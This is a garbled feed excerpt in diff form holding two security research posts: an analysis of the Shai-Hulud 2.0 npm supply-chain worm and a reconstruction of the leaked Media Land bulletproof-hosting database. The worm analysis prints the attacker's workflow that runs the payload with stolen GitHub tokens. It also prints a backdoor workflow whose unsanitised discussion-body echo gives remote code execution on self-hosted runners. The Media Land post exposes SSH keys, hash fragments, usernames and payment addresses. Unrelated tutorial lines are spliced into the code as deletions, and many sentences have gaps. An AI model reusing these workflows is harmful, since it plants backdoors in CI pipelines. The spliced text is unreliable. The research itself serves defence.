+                Get CAI ]]></content:encoded></item><item><title>Shai-Hulud 2.0: the supply chain attack that learned</title><link>https://blog.gitguardian.com/shai-hulud-2/</link><author>/u/mabote</author><category>netsec</category><pubDate>Fri, 28 Nov 2025 14:07:08 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Two months after the initial Shai-Hulud supply chain attack in September, the threat actors have returned with a new, updated campaign they refer to as "The Second Coming". It leverages the same worm-like propagation mechanism observed previously, but with updated tactics, probably learnt from their initial mistakes.As of November 26th, 17:30 pm CET,  packages (and 1700 versions)  have been infected by the worm.In the first campaign, CI/CD secrets were exfiltrated to a public internet endpoint that quickly got rate-limited. In this new iteration, they are directly exfiltrated to GitHub repositories created using the stolen credentials.Over 33,000 secrets exposed during the attackOur analyzed snapshot comprises 20,649 repositories that were publicly exposed on November 24. We processed the malware outputs, scanned the environment captures (for example, environment.json), and ran validity checks wherever technically possible.The original files, as exported by the malware, contained a total of 8.3M of secret occurrences, representing only 339k unique secrets. A preliminary analysis revealed that the dataset contained . Especially, a lot of Box authentication was reported by the tool, which all originated from one of the malware’s own JavaScript dependencies, which got included in the victim’s file system scan.To reduce the False Positive rate, we post-processed all the secrets identified by the malware with GitGuardian’s engine. We also performed an additional scan of the environment captures (), in an attempt to identify more leaks, and ran validity checks wherever technically possible.In total, we identified 294,842 secret occurrences, corresponding to . Duplication is substantial: each live secret appears in roughly eight different locations on average.Of these, 3,760 were unique valid secrets at analysis time. The true number of valid secrets at the time of the leak was likely higher, as many credentials appear to have been revoked or rotated before our validation pass.The validated secrets are heavily concentrated in developer platforms and automation hooks. GitHub credentials dominate with 581 Personal Access Tokens, 386 OAuth tokens, and 104 Fine‑Grained PATs, alongside 101 GitLab tokens, each enabling repository read/write, workflow manipulation, and potential supply‑chain impact. Altogether, these top ten categories account for 2,463 unique validated secrets (about two‑thirds of all validated items), highlighting how a small set of credential types drives most of the actionable risk.The very nature of the attack explains the prevalence of GitHub personal tokens in the leaked secrets. To exfiltrate harvested secrets, the malware needs access to a valid GitHub authentication token. This token is included in one of the leaked files, . Therefore, each exfiltration repository contains at least one of those tokens. However, by nature, they are heavily duplicated.Shai‑Hulud 2.0 followed the same broad playbook as the original campaign, poisoned package, local harvesting, public‑repo drop, but the November 24 wave was faster, more automated, and experimented with new collection pathsInteresting fact : The first data point is from November 21st 3 days before the actual compromise started, in ewobwrkwro/h5r0bk05g5r8k73 . We suspect that the attacker was doing some tests (only truffleSecrets.json and actionsSecrets.json file).On November 21, 2025, three days before the main attack events, a first set of repositories linked to this campaign appeared on GitHub. The first one was named  and contained three files:: The obfuscated payload as observed in the main phase of the attack.: A modified version of a legitimate bun installation script that will execute the post-obfuscate.js payload..github/workflows/new.yml: A workflow file that will run the setup_bun.js script in the GitHub CI/CD.on:
+  workflow_dispatch:
 
-Backtracking is a problem-solving method where you return to a previous
-decision point (backtrack) in a process and try a different option when the
-current path fails to produce a valid result. It is like being in a
-labyrinth with multiple paths. You try one path, but hit a dead end. So, you
-backtrack--go back to the last junction where you had other options--and try
-a different direction. You keep repeating this process until you either find
-the exit or exhaust all paths.
+jobs:
+  job1:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: unset GITHUB_ACTIONS && node setup_bun.js && echo "Sleepng" && sleep 600
+  job2:
+    runs-on: windows-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: set GITHUB_ACTIONS= && node setup_bun.js && echo "Sleepng" && sleep 600
+  job3:
+    runs-on: macos-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: unset GITHUB_ACTIONS && node setup_bun.js && echo "Sleepng" && sleep 600
+The content of this repository indicates it was used as a test infrastructure by the threat actor. The malicious payloads seem to have been prepared to run all of GNU/Linux, MacOS, and Windows operating systems.The execution of the payload in the test infrastructure brought the creation of a second repository, ewobwrkwro/h5r0bk05g5r8k73, containing the result of the secret extraction on this infrastructure. The five exfiltration files were added to it. Unfortunately, because the test victim CI/CD runner was a default GitHub machine, those files provide no insight into the attacker’s environment.The test  stayed live on GitHub until November 24 at 5 a.m., about the time the main phase of the attack started. After which, the whole GitHub account was deleted.Analyzing this preliminary phase of the attack has been possible thanks to GitGuardian’s historical archive of GitHub activity.In this second wave, the activity came as a sharp, same‑day burst on November 24. It peaked in the morning and decayed quickly, rather than unfolding slowly over several days. Local harvesting was also more systematic: beyond environment dumps, a structured local scan (truffleSecrets.json) ran in roughly two‑thirds of executions and produced results in most of those runs. The actor appears to have added a cloud‑credential collector as well. A new artifact (cloud.json) showed up almost everywhere but was essentially always empty, which suggests the step malfunctioned or ran without access on most hosts. Several constants remained. Delivery still hinged on a malicious package update that executed during install or build in developer and CI environments. Exfiltration continued to use an attacker‑controlled public GitHub repository as a dead‑drop. And the primary targets were unchanged: environment variables, local configuration, credential files, and CI secrets (.env, private keys, service/API tokens) remained the richest sources.The net effect is a campaign optimized for speed and breadth while testing additional collection paths in the cloud. Even with the cloud step failing in practice, the combination of environment dumps, local scans, and selective CI probing produced a concentrated burst of real exposures on November 24, showing how install‑time code execution can translate into immediate, multi‑channel secret leakage at scale.PostHog appears to be patient zero in Maven compromise. After their credentials were compromised, the attacker pushed a malicious update to the PostHog npm package. Separately, there was an automated build/replication step that mirrors certain npm packages into the Maven ecosystem by repackaging the npm tarball as a Maven artifact. Because of that pipeline, the already‑poisoned npm package was automatically copied into Maven. That does not indicate a second, independent Maven compromise: it’s the same payload propagated through a mirror. Beyond this mirror, we’ve only seen a single Maven package affected and no evidence of the attacker publishing arbitrary Maven artifacts directly. The Maven impact is therefore derivative of the npm compromise and limited to the mirrored coordinate.Backdooring and remote accessOne of the most notable evolutions in the Shai-Hulud malware is the addition of a backdoor and remote access feature in the malicious payload.Upon execution, when a GitHub authentication token is available after the credential harvesting step, the malware will register the compromised system as a new GitHub action workflow runner. Additionally, it will set up a new malicious workflow file in the repositories. name: Discussion Create
+on:
+  discussion:
+jobs:
+  process:
+    env:
+      RUNNER_TRACKING_ID: 0
+    runs-on: self-hosted
+    steps:
+      - uses: actions/checkout@v5
+      - name: Handle Discussion
+        run: echo ${{ github.event.discussion.body }}This workflow is interesting for two reasons:It requests the workflow jobs to execute on a self-hosted runner, which can be the newly registered compromised machine.It contains an injection vulnerability in the main job, which allows arbitrary code execution on the workflow runner.This mechanism allows the attacker to remotely execute code on previously injected machines, using GitHub discussions as a Command & Control channel. Such a remote control mechanism could allow threat actors to even after all infected NPM packages have been removed. However, the active deletion of the affected repositories by GitHub should effectively prevent the usage of this feature to restart the attack in the long run.At the time of writing, at 5 p.m. CET on November 27, GitGuardian did not observe real attempts to exploit the remote control feature of the malware. However, a small number of people, likely unrelated to the threat actor, created discussions on affected repositories with security implications.Exfiltration mutualizationA last concerning pattern that we repeatedly observed across compromised actors is the ability for the malware to exfiltrate secrets even when the victim does not have access to GitHub directly. In such a situation, the malicious code is capable of using the GitHub search feature to identify a previously created exfiltration repository, download it, extract a valid GitHub authentication token from it, and use it to exfiltrate the current victim’s secrets.As a result, many repos that host the leaked artifacts don’t belong to the original victim at all; they’re merely staging areas controlled with stolen keys. This also means attribution by repository owner is unreliable, and defenders should watch for unexpected repo creation or pushes that include files like environment.json or truffleSecrets.json under their own accounts, even if the data inside appears unrelated.This mechanism participated in duplicating the valid GitHub authentication tokens across a lot of exfiltration repositories.Malicious Repositories characteristicsThe exfiltration GitHub repositories could be identified using several patterns:These GitHub repositories could be identified using several patterns:the description is Sha1-Hulud: The Second Comingthe name is a randomly generated string of 18 characters such as zl8cgwrxf1ufhiufxq or bq1g6jmnju2xpuii6uthe filename , containing a JSON document with the detected AWS, Azure, and GCP secretsthe filename , containing a JSON document with system information, the token GitHub used for exfiltration, and its associated metadata such as the login or the emailthe filename , containing a JSON document with environment variablesthe filename , containing a JSON document with the secrets exfiltrated from GitHub actionsthe filename , containing a JSON document with a list of secrets detected locally using TruffleHog Open SourceThese files are added in different commits that happen one after another.  and might not exist depending on the detected secrets. On the contrary, the  file, containing the dump of the victim’s machine environment, is present in all observed repositories.This environment file is particularly interesting as it provides important insight into the environments that were affected. For example, the variables named   or  indicate that not only developers were targeted but also CI infrastructures, exposing private internal services.From the data we observed in the  file, about 20% of the compromised machines are GitHub runners. This would indicate the payload was executed during the build of a project using a compromised package as a dependency.Check if your secrets were exposedTo check if you’ve been impacted by this second wave of attack, the first thing you’ll want to do is identify potentially leaked secrets. You have 2 options for this1/ If you’d like to check if specific secrets were leaked, you can use   either directly on the website or with the help of the GitGuardian CLI tool . We’ve enriched our database of leaked secrets SHAs with every secret we were able to capture during the second wave of Shai-Hulud so this is a good option if you know which secrets you want to check. 2/ If you are a GitGuardian customer, and would generally like to check if members of your Public Monitoring perimeter were targeted in the attack, you can run the following Search Query in Explore:(file.filename: truffleSecrets.json OR file.filename: cloud.json OR file.filename: contents.json OR file.filename: environment.json OR file.filename: actionsSecrets.json) AND commit.committer.date:{2025-11-23 TO *} This will either return no results, which means that we didn’t find information leading us to believe that the Github accounts of developers who are part of your public monitoring perimeter were compromised and part of the attack. If it does yield results, you’ll want to note in which repositories those results were found.After those investigations, if you now suspect that some of the repositories in your perimeter were part of the attack, and you’d like to have more information on the secrets that were inside those, please contact  and we’ll help you investigate.The evolution from the initial Shai-Hulud campaign to "The Second Coming" shows how supply chain attacks are getting smarter. Threat actors are learning from past campaigns - their own and others' - and adapting their tactics accordingly. Moving from easily blocked endpoints to using stolen credentials for exfiltration through legitimate GitHub repositories is a clear example of this learning in action.This campaign also confirms what we already know: secrets are the weakest link in modern software supply chains. With at least over 294,842 secrets exposed and 3 and 20% of compromised machines being GitHub runners, the attack hit both developer workstations and CI/CD pipelines. As supply chains become more interconnected, effective secrets management isn't just a security best practice anymore. It's a necessity.If you want to collaborate with GitGuardian’s researchers on this topic, contact us.This incident was first announced and reported by Aikido Security. For their analysis and ongoing updates, visit ]]></content:encoded></item><item><title>The Anatomy of a Bulletproof Hoster: A Data-Driven Reconstruction of Media Land</title><link>https://disclosing.observer/2025/11/24/bulletproof-hoster-anatomy-data-driven-reconstruction.html</link><author>/u/0x5h4un</author><category>netsec</category><pubDate>Fri, 28 Nov 2025 09:13:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
+This post uses the leaked internal database of Media Land, a sanctioned bulletproof hosting provider, to reconstruct how its platform organised customers, subscriptions, virtual machines, and IP address space across billing, compute, and network layers. By rebuilding the schema locally and pivoting on stable identifiers such as user IDs, SSH keys, and payment records, it derives operational profiles and highlights clusters of accounts that behave like resellers in terms of subscriptions, address allocations, and cryptocurrency payments. The same internal IP assignment history is then cross-referenced with public indicators linked to the Black Basta ransomware group, producing a set of 74 Media Land customer accounts that at some point managed IPs later mentioned in the Black Basta leak, including one large reseller-style account. While this does not attribute specific individuals, it shows how internal hosting records can illuminate the supply chain that underpins ransomware operations and support more structural forms of threat intelligence.On 28 March 2025, internal data from Media Land, a hosting provider repeatedly linked to bulletproof services, was leaked online. The material first appeared on Telegram and was later referenced by public reporting, exposing information about Media Land’s backend systems and the infrastructure used to facilitate cybercrime activities. According to PRODAFT, the leaked data contains information about server purchases, financial transactions, payment methods (including cryptocurrency), and some personally identifiable information of Media Land’s users. Half a year later, on 19 November 2025, the UK, US, and Australia announced new sanctions targeting Media Land. The announcement explicitly referenced the role of resilient hosting infrastructures in enabling large scale attacks on European businesses.This post uses the leaked Media Land dataset to give a data-driven reconstruction of how a bulletproof hoster is organised. By rebuilding the database structures and analysing subscription records, instance histories, and IP allocation logs, we can map structural patterns in the platform’s operations. These patterns include the separation of core infrastructure and customer infrastructure, distinctive behavioural profiles, such as large-volume address consumers and unusually large payments originating from single accounts.In what follows, I first reconstruct how Media Land’s internal systems fit together as a hosting platform. This is an interesting insight in itself. Then, I look at how different customer segments used that infrastructure in practice, before finally linking internal records to external indicators of compromise, focusing on Black Basta.The objective is to show how bulletproof hosting infrastructures organise, allocate, and recycle address space. Additionally, this post aims to explore how this type of leak can be used for threat intelligence by cross-referencing and pivoting into previously observed abuse indicators.If table-level details are not your thing, you can safely skim this section and jump ahead to “Reconstructing Customer Activity and Resource Allocation”, where I focus on behavioural patterns.The Media Land leak provides a rare internal view into how a criminal (monolithic) hosting platform handles its internal registration over time. Rather than being a single snapshot, several tables record longitudinal history, which lets us reconstruct lifecycle patterns and infrastructure use as well.At a high level, the leak spans three layers:Customer and billing layer: who the platform considered a customer, what they bought, and whether those purchases were active or cancelled. Here, Media Land’s incomplete customer tracking already shows a clear lack of Know Your Customer processes.Compute and service layer: what virtual instances existed, how they changed state, and which users controlled them. which IP addresses were assigned, when, and to whom, including both IPv4 and IPv6 ranges.The most operationally useful part is that these layers are linkable by stable identifiers. This makes it possible to pivot from a user account to subscriptions, from subscriptions to assigned IP space, and from those IPs to observed operational behaviour over time.The leak contains a coherent snapshot of the internal data model used by Media Land’s hosting platform. The exposed tables fall into several functional domains that together describe users, subscriptions, virtual infrastructure, IP allocations and billing activity across PostgreSQL, MySQL, VMManager, IPMI, VXLAN, KVM, Libvirt, and Ceph. Although each table on its own is limited, the combination provides a nearly complete view of how customers, servers, and addresses are linked inside the platform. This section describes what each group represents and how they fit together.The platform distinguishes between two concepts that behave like “user accounts”. The  table stores the identity of real human customers for as far as they fill in accurate details, while  contains the operational accounts that interact with the virtual infrastructure. In practice, these two usually belong to the same person and share the same identifier, but they appear in different tables because infrastructure operations and billing operations are handled by separate subsystems. Both tables ultimately link into billing, network assignments, and virtual machine activity.A cluster of billing tables records how customers subscribe to virtual machines, how renewals occur, and which payments were issued. The central element is , which ties users to active or cancelled services, often paid for in Russian Rubles. Related tables track add-ons, balance adjustments, and historical actions. One notable table is , which confirms that Media Land supported cryptocurrency payments and used price and amount tracking fields rather than a simple “paid or not paid” flag. This makes the billing system an important source of behavioural information, because subscription patterns and payment histories correlate strongly with reseller activity.Virtual Machine Lifecycle and ProvisioningThe provisioning subsystem consists of tables that represent virtual machines and their state changes. The table  stores the current state of a VM, while  records every creation, deletion, and migration event. The  table contains operational faults such as failed provisioning or host-level errors. Together, these tables document how customers interacted with the platform: how many VMs they deployed, how often they recycled them, and whether they were running high-churn infrastructure.Host Nodes and Assigned IP AddressesThe infrastructure layer covers the physical or virtual host nodes and the addresses routed to them. The  table lists the compute nodes that run customer VMs.  represents individual addresses assigned on those nodes, including their address, IP family, and the account to which they were bound. This layer sits closest to the boundary between customer behaviour and internal operations, because it reflects real resource consumption and routing-level behaviour.Network Assignment and IP HistoryThe network subsystem manages how IP addresses and prefixes move between users and virtual machines. The most important table here is , which logs every address assignment with timestamps, assignment type, and associated VM or subscription. This table provides a historical record of how the address space was used over time and is one of the strongest indicators of reseller behaviour. A smaller table, , records IPv4 or IPv6 prefixes delegated to specific customers.Administrative Controls and Internal OperationsThe leak also exposed a small set of administrative tables that reveal how Media Land structured internal access and oversight. These include the admin accounts themselves, some credentials, their roles and associated permissions, and a login history that records when staff accessed management interfaces. They instead act as a map of Media Land’s internal control surface, showing which administrator accounts existed, what privileges they were assigned, and how often they logged in. This information does not necessarily indicate malicious intent, but it provides valuable context for understanding the separation between operational automation and human intervention inside the platform.The Media Land leak exposes a fully integrated hosting platform where authentication, billing, compute orchestration, and network provisioning operate as one tightly coupled system. The tables show how each subsystem feeds the next. User records link directly into subscriptions, subscriptions trigger virtual machine provisioning, and provisioning events produce IP allocations that appear in the network history. This creates a clear end-to-end chain from customer identity to infrastructure footprint.Several architectural patterns stand out. Media Land separates human-facing accounts from infrastructure-facing accounts, yet both feed into the same subscription and network assignment logic. Billing events act as the operational trigger for most downstream activity. The compute subsystem is structured around lifecycle events rather than a static configuration record, which suggests that provisioning and instance management relied heavily on automated workflows. The network subsystem captures every address assignment in granular detail, which makes it possible to reconstruct how blocks were used and how often they moved between customers.The presence of VXLAN overlays, saga workers, and IPMI references points to a modern orchestration stack built around asynchronous tasks and network virtualization. The MySQL side of the leak confirms that the platform handled both customer-visible resources and underlying host node coordination. This design resembles a compact, self-hosted cloud environment rather than a simple VPS reseller panel. That structure matters, because it gives us an end-to-end path from “who is the customer?” to “which IPs did they actually use, and when?”. This is what I turn to next.Address Space and External Routing ContextThe infrastructure layer also reveals how Media Land organised and utilised its public IP space. The leaked data shows that customers were provisioned with addresses drawn from a small but distinct collection of IPv4 and IPv6 ranges:Important to note is that the range  is registered as being used by customers in , but has since been reallocated to . Therefore, this could show up in the leak but is no longer part of the Media Land infrastructure. Moreover, the range  is listed internally as , which checks out as it is part of a sister company called  and geolocates to the Netherlands instead of Russia. The  table suggests that this subnet is used for customer-facing hypervisor pools. For as far as Media Land still owns the prefixes, all of these ranges are announced under AS206728.These blocks account for every address observed in the leak, all originating from AS206728 and AS215376. The IP allocation behaviour shows that these prefixes were treated as a shared pool available to many users at the same time, rather than as dedicated ranges tied to individual customers. These ranges can therefore be monitored in passive DNS, BGP announcements, and future threat intelligence feeds to track the re-emergence of related infrastructure.The structure of the leaked data makes it possible to follow a customer from initial signup to full infrastructure usage. Each user in  or  spawns one or more subscriptions. These subscriptions then act as the source for all provisioning activity. Customers with a large number of subscriptions often show up as heavy users of instance history, IP allocation, and prefix movements. In other words, we can move from a static picture of tables to a dynamic view of how different kinds of customers actually used the platform over time.The  table, as mentioned, logs every creation event, deletion, migration, or restart. By grouping these records by , patterns can be derived that differentiate casual customers from high-volume renters. Some users create only one or two machines, others create thousands, often within tightly clustered time windows, which is typical of either automation or panel reselling activity. Instance events correlate strongly with IP allocation patterns in , where the same users accumulate large numbers of addresses across a small number of parent blocks.Resource allocation becomes especially visible when following the lifecycle of an IP. Every address in  includes the user, subscription, entity type, and assignment event. By aggregating these assignments, it becomes possible to identify users who consistently draw from the same small set of IPv4 /24s or IPv6 /48s. Some of these patterns reflect normal internal pooling, while others indicate users who received unusually continuous portions of the same parent ranges, which suggests structured access rather than random allocation (in line with reseller structures).The combined compute and network perspective reveals three distinct customer types: a small group that receives a wide spread or parent blocks, often at higher levels of exclusivity. a larger group that receives many IP addresses but almost always from the same four parent ranges. users with small numbers of subscriptions and instance events.This division does not confirm reseller activity on its own but it highlights operational segments that behave differently inside the platform. Additionally, the allocator group may as well consist of internal testing, as the subscription IDs for the allocators show a high volume of services for which none are paid. The state of these services consistently display a  state.By reconstructing these flows across subscriptions, histories, and network events, the leak allows a detailed look into how Media Land allocated resources and how specific customers used them. The observable patterns and volatility align with the known behaviour of infrastructure used for frequently replaced operations such as malware distribution, phishing, or command and control nodes. Interpretation, however, requires caution and should remain grounded in structural evidence rather than speculation.The structural reconstruction of Media Land’s systems is useful for understanding how the platform functioned internally, but the leak also offers practical intelligence that can support ongoing detection efforts. Up to this point, the focus has been on what the leak tells us about Media Land itself. From here on, I use the same data to extract operational indicators that can support threat hunting and attribution work. Because the data spans user activity, instance lifecycles, and entire IP-assignment history, it enables the extraction of stable behavioural patterns that extend beyond the specific IP ranges and ASNs currently associated with Media Land.The following sections will dive into the data to do some analysis with the goal of linking Media Land users to observed abuse.Preparing the Data for AnalysisBefore talking about specific findings, it is worth briefly outlining how I turned the raw dump into something I could analyse. As shown in Figure 1, the raw dump spans multiple subsystems: billing, lifecycle management, network assignments, authentication, and each uses its own timestamp formats, identifiers, and schemas. To find more patterns, the individual subsystems can be programmatically referenced using the identifiers (representative for the edges in Figure 1). In particular, the user identifiers reoccur in various different places. This will allow us to build profiles.All tables in the PostgreSQL were rebuilt using  program, allowing for a locally hosted version of the databases. All tables were then loaded into a Jupyter notebook as Pandas dataframes. Identifier columns (, ) were cast to string to ensure table-stable joins, and temporal fields like start and end datetimes were unified to timezone-aware UTC.Columns were harmonised based on semantic equivalence (such as , , or  all representing account creation) so that downstream logic could operate on normalized fields.To make sense of individual user behaviours, the normalised data was consolidated into Markdown . Each profile captures information linked to a given user identifier:Full IP-assignment historyThe logic is straightforward: start at the user id, pivot to the  table and locate the account tied to the user id, then do the same for any cryptocurrency billing, virtual machines, and IP assignments. This allows us to read the dataset not as a collection of tables, but as longitudinal traces of individual resource users.With the profiles in place, we can finally look at how different actors behaved inside Media Land’s infrastructure: who used large amounts of IP space, how email and payment patterns clustered, and where SSH key reuse ties seemingly separate accounts together. These findings are of course not claims about intent, but observations about how infrastructure was used within the platform. For the same reason, I will not include any full email addresses and PII in this post but will partially redact them instead. The full details remain confined to the research environment.93ad06b4-c186-431e-82d2-33ac2fad4e628c22c958-bbc6-4dd8-b7b8-c64506a754ffe5249019-ce0f-43d0-8b2d-a5f1a68d5265be6f972d-54e1-49c5-9710-38f42ef8a58db122f10a-6cc6-4a2f-a7e5-3d980d581eac87b7b188-f67f-48b4-8e35-76488896f8e8Email Address and Password PatternsMost accounts had hashed passwords tied to them, but the surrounding metadata reveals repeated patterns of throwaway email providers, multiple user IDs controlled through the same email address, some addresses linked to tens of subscriptions and hundreds of IP assignments, or even a case of password re-use. When combining email clustering with SSH keys, BTC payments, and IP (re)allocation, specific operational clusters can be discovered: isolated groups of accounts that share provisioning patterns, payment patterns, SSH keys, and display handover coordination through resource reallocation. These clusters do not necessarily correspond to individuals, but they possibly represent operational entities inside Media Land’s infrastructure.1f2ae72c-de28-47b9-8be0-f5026cd48c23te***********om@protonmail.com$2b$13$sDurL1.0/9QlBOCsIjVLr.Xn********************kdXGiTDRL8f728d4a-687e-4aea-bd8d-b44256f5b30c$2b$13$sDurL1.0/9QlBOCsIjVLr.Xn********************kdXGiTDRLAs listed above, there was a single case of password reuse, leading to the discovery of another account that was created nearly three years prior. Now, of course it is possible that people use the same passwords. However, with 1666 total observed users, it is unlikely, which means we could consider these two accounts as potentially belonging to the same person. Interestingly, the name this person has given to the account is Мистер Ресселер, translating to “Mister Reseller”.Additionally, there was a high degree of (disposable) email (re)use. Examples of recurring domains are:For most of these throwaway emails, there is only a single subscription for 250 RUB that is deleted after some time. However, there is also one email address that has 40 accounts attached to it by numbering accounts. As such, there is a list of users with email addresses like:These accounts also contain a significant number of Bitcoin payments, showing 12 payments amounting to a total of ~34.08 Bitcoin (which, taken into account registered BTC values at the moment of the transaction, makes a total of RUB 44,494,110.00, or EUR 488.824,31) paid to Media Land between July and October 2022 by this entity, each time with a different BTC address. While not conclusive, the payment amounts, number of IP assignments, and number of accounts suggest that this could be a reseller brokering access to Media Land infrastructure. Following the transactions does not seem to lead to a clear BTC address associated with Media Land and there were no users found that used the same Bitcoin address to make payments.PMTvc3e4NQX4v45NAXpaG2Yq44NJ8MpCSeXNh6wnBYrSpcTxQcTfK32MeTrsYDKdMvFo8kLS45xd6o5JDCb666RPMTv4acx5euFy97KpERK1G4nitVbMyzmfrwL332dcnmdq6seZMjQu3MNoaJjBZ4yRutatQZX2s9r8LmyshrTMCc(Automatically Generated) SSH KeysUsers that had made a purchase often also had an SSH key associated with this machine. These were either SSH keys uploaded by the users themselves or keys that were automatically generated. The automatically generated keys follow the same naming convention and include the day they were generated:ant*******dinov@sshvps.netssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoFZcPJ+gM01bnjuD3tZZGDWKAbjL+er6QpOs9W6SG7jp9rGp22X5aKnKVmnC6ENpDzOPveKAS5FPnWOmMLhBoSHZM7Q3+1S6YB+Kq+XrHHKcQ04sdFjH2rCn5o7cvy0U1Rit73aD5NSLMyxi5/NEXkQnQVNegBQeNDZdJuSFQ9hWXS8RFrXgtMoXspTnyq+wNywaS/gz8MTP9WJVq+WLT4pjdBA2sBKawtF3gGcEZ4clov5xnL4E9n2I572pyFOiESBim9aYEY5hKQlcCLBKcVS2QCd8z3Ny0rIckA1pziB+wQgmFoENsTax4EbWjdecAWhN0mwTjREz+6yf2KEMiw== rsa-key-20221011ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTKSnbaptHMi8NoFo9mgSjEFq8kp01n5rPUatkFyGsfdY8EELwWzs84nUshvDReeXZcXqu1sSio7cXls2UHPsoQaPm8jBI0GxM7oq2apm7yIE1QswmbL0R02IO4iTM6RR131Q2czDa8fTRcYAe8cdG3ZZkUkNAn1di9UJadeLlHeR4AA9fQDLEU0Q2WLCPpmgXKzLylnoOWXR2CYIfRLqyPrq8TfcbMwKXAiUcE7i5NFg7aTCMfz5JQQfpisSY4o9iLmtx8dp3jzl7xQtu+avGgTAz7nTv9N45N6fvxbgQKuo+KUScZA1IEYI2aagq0wzDIgM/SPyw+sh49NU3klB9 rsa-key-20240725ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCN8EVkuuMcmcb0o+Mi8mZWNMLOEgnNWkzfp+e89W9fh6uGGALR7AuvZK4s7t/0LxZVHe2hqm1YL6PiSkGtAlHCCwDaXEwl+35DBO+l/WZlxarFZoRpuy3fmWAIsqE+ReDHOCOGv1bB18cpfyg2pL4fMDGDe/6pcHJFG0G+6Z+e3oPCDtWzvlfDGPFMpSEmbspjpwW5v28VkSf0kPkXOi1M4SZBKcEhQIfik6mCIzSb47OGSjk8tk566uUOvapLZb2EwzGxn4ZBJaFFQnG+SOxgFpmtitniz59GyMJ+5R6nd226xS8XKYgUPMI5z5vs+qwgAOGq79uHSg16g9Kt1myb rsa-key-20220214ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrWJQojQB7rUOpiyDEdsAUva0o/c2T6Kx4AQvbDEq3Awo2+yJ4TmWw9n24u0XH8c3UYzQUoO+UM+Vh0Klg7p4SpAvkbKFtmj1bs9T6fwX5Pesh4BryFrpW6zGctsmOlJ8Ns/XWG0PUUtBFlByJrBloa1Trn0xJqo8nUO07m5NNl96vSje3m/2PysqRcW4y189+JRgT1uIcejHjBQsGQqbwpz47WK89AODSgY3ssrYgjRdoEz7FD1BUCzW8l9gWoXK4xoNmrgIbXqFsDT8a7yq4LpLxMMZ2Q5UwLO4jAd2SG7XzddPk/tOtAb+Im9OkL0l277HeGx/jupOCsT+vz2fzkSBjtGjuFS0oJC6LFJeeEGP6gHbnjP45VumYnSo7pgWa/uWswz8buuchieUKT3X92dXbNGO8h1mpuOgkzGz55zI5DY6405YW0g5waJocvAQQRs6oF/v5VcktIEHGg9Dn+44vfxbafu6ESijfVTm72sL6irp5shnNm2X06xuS5LE= valentina@valentina-ubuntussh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrWJQojQB7rUOpiyDEdsAUva0o/c2T6Kx4AQvbDEq3Awo2+yJ4TmWw9n24u0XH8c3UYzQUoO+UM+Vh0Klg7p4SpAvkbKFtmj1bs9T6fwX5Pesh4BryFrpW6zGctsmOlJ8Ns/XWG0PUUtBFlByJrBloa1Trn0xJqo8nUO07m5NNl96vSje3m/2PysqRcW4y189+JRgT1uIcejHjBQsGQqbwpz47WK89AODSgY3ssrYgjRdoEz7FD1BUCzW8l9gWoXK4xoNmrgIbXqFsDT8a7yq4LpLxMMZ2Q5UwLO4jAd2SG7XzddPk/tOtAb+Im9OkL0l277HeGx/jupOCsT+vz2fzkSBjtGjuFS0oJC6LFJeeEGP6gHbnjP45VumYnSo7pgWa/uWswz8buuchieUKT3X92dXbNGO8h1mpuOgkzGz55zI5DY6405YW0g5waJocvAQQRs6oF/v5VcktIEHGg9Dn+44vfxbafu6ESijfVTm72sL6irp5shnNm2X06xuS5LE= mvmpp@LAPTOP-9M7611VJSimilarly, the earlier discussed account used the same naming conventions over various keys, allowing further tracking of related accounts by using the key name as a pivot point. Comments for such keys include phrases like , which translates to . Where the key name  is quite anonymous, valentina@valentina-ubuntu gives away more information.Using the SSH keys as a pivot point, there were 344 unique SSH keys of which 4 keys could be used to cluster multiple accounts together:14****u5@comparisions.net, fe*****o@linshiyouxiang.netssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrCEG74WDUJsaCtN/8y9/YIneh3MKgVugC/nG61diMurea3QFOuA1yWxDIWkWgXj0jz9Tz6XnQv8laBu28hAAS2hJJlFRpK8h6gFY9Wg6DheG1LIl18tVg/07keaCrqbFIP6VOcJe+mUAdUbDHF4Dt5Turc008X4V0JML0LqAWPV9WLfXvBJnTNzV/fkTJQKDCIgXDLxII3uav9VD/hmIyXmAJBTfJG+s3eXOn7zthCyVhXzfzK6KiEduAp/Zmkf0JYUQy9pFrTFq37lleAHbcRjmLVzvaga/PDDOXQr7gc9qGrNhLsycg6iM49nO1j30YEBturtcBwQzamBoLpXwbs0Ap1bwsRsFbgIYvtuxejxnXy7fkUms2Mp140VvBCGAQll3o63oMLj5yNVw2aXUK3ay3IS29e15w8zJAJjggEUQAEZqwBt1Na3MwPkHiZ256UKVg4F4UiJCxZMogXruoKm+OajMLdlTgLDOsXqhoLcvrf+Q331d1ekDj3MfkN7c= administrator@PC-202207021402Cluster of 17 accounts, example: ait*****8@gmail.com, faz********r@gmail.com, server******7@gmail.comssh-rsa 